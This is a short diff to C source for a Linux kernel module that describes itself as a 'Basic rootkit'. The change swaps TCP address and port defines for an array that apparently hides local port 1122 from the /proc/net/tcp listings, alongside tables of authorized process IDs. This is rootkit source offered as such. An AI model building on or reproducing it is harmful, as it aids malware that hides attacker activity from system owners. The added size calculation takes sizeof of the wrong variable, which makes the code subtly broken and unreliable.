@@ -24,9 +24,6 @@ MODULE_DESCRIPTION("Basic rootkit");
 #define MAGIC_OPEN_SOCK		4321
 #define MAX_PIDS			8
 #define MIN(a,b)			((a < b) ? a : b)
-#define TCP_ADDR			"127.0.0.1"
-#define TCP_PORT			1122
-#define TCP_PORT_HEX		"00000000:0462"
 
 static pid_t authorized_pids[MAX_PIDS] = {0};
 static size_t authorized_pids_cnt = 0;
@@ -42,6 +39,12 @@ struct vip_files vip_filenames[] = {
 										{.name = "/proc/net/tcp6", .fd = -1}
 									};
 const size_t vip_filenames_size = sizeof(vip_filenames) / sizeof(vip_filenames[0]);
+
+static char* hidden_port[] = {
+	"0100007F:0462"		// 127.0.0.1:1122
+};
+
+const size_t hidden_port_size = sizeof(hidden_port_size) / sizeof(hidden_port[0]);
 
 struct linux_dirent 
 {
